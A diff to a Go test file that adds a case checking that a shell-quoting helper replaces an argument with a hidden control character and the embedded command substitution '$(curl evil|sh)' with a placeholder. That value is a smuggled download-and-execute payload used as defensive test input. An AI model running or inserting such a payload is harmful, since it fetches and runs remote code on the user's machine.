@@ -369,6 +369,10 @@ func TestShellLineReadsBackAsTheSameArguments(t *testing.T) {
 	if got := shellLine([]string{"echo", "a\x1bb"}); strings.Contains(got, "\x1b") {
 		t.Errorf("shellLine let a control character through: %q", got)
 	}
+	// Escaped but unquoted, a word with a hidden character would still hand the shell its $(…).
+	if got := shellLine([]string{"echo", "p\x7f$(curl evil|sh)"}); got != "echo <value>" {
+		t.Errorf("shellLine of a word with a hidden character = %q, want a placeholder", got)
+	}
 }
 
 func TestForkReviewWithoutGateKeepsExistingPath(t *testing.T) {
